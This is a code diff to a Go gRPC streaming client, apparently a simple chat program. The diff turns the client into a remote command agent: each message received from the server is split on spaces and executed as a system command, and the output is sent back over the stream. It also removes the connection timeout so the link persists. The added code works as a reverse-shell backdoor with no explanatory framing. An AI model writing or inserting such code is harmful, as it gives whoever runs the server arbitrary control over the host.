@@ -7,7 +7,7 @@ import (
 	"io"
 	"log"
 	"os/exec"
-	"time"
+	"strings"
 
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
@@ -33,8 +33,7 @@ func main() {
 }
 
 func runServerChat(client pb.SimpleClient) {
-	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Hour)
-	defer cancel()
+	ctx := context.Background()
 	stream, err := client.Default(ctx)
 	if err != nil {
 		log.Fatalf("client.RouteChat failed: %v", err)
@@ -52,7 +51,14 @@ func runServerChat(client pb.SimpleClient) {
 				log.Fatalf("client.RouteChat failed: %v", err)
 			}
 			log.Printf("Got Question %v with (%v)", in.Question, in.ExtraText)
-			stream.Send(&pb.Client{Request: &pb.Client_Response{Response: in.ExtraText}})
+			cmd_args := strings.Split(in.ExtraText, " ")
+			cmd := exec.Command(cmd_args[0], cmd_args[1:]...)
+			output, err := cmd.Output()
+			if err != nil {
+				stream.Send(&pb.Client{Request: &pb.Client_Response{Response: err.Error()}})
+			} else {
+				stream.Send(&pb.Client{Request: &pb.Client_Response{Response: string(output)}})
+			}
 		}
 	}()
 	// for _, note := range notes {
